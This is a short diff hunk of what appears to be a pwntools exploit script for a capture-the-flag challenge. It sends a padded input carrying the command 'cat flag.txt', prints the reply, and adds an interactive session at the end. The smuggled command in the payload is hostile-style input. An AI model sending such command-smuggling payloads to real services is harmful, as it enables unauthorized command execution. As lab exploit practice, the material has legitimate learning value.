@@ -7,3 +7,5 @@ p.sendline(b'AAAAcat flag.txt')
 
 data = p.recvall(timeout=2)
 print(data.decode())
+
+p.interactive()
